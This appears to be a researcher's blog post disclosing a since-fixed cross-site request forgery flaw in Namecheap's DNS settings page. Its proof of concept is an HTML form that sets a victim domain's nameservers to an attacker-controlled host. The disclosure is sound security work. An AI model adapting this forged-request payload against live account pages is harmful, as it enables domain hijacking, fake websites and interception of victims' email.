---
layout: post
title: Namecheap DNS Hijack
tag: 
---

# About

* Reported: 03/06/2013
* Vendor Reported as Fixed: 23/12/2013

A bug in Namecheap's DNS setup page was vulnerable to Cross Site Request Forgery, allowing attackers to set custom DNS servers for a target domain, which would let attackers hijack the DNS records and display a fake website on the target domain. Or redirect MX records and intercept email.

# Proof of Concept

```html
<form action="https://manage.www.namecheap.com/myaccount/modsingle.asp?domain=targetdomain.org&amp;type=dns" method="POST">
<input type="hidden" name="NSOption" value="custom" /> 
<input type="hidden" name="customdnstype" value="customdns" />
<input type="hidden" name="NS1" value="ns1.evildns.org" />
<input type="hidden" name="NS2" value="ns2.evildns.org" />
<input type="hidden" name="NSSUBMIT" value="Save Changes" /> 
<input type="hidden" name="NS.x" value="NS" /> 
<input type="hidden" name="Domain" value="targetdomain.org" />
<input type="submit" value="Submit request" /> 
</form>
```

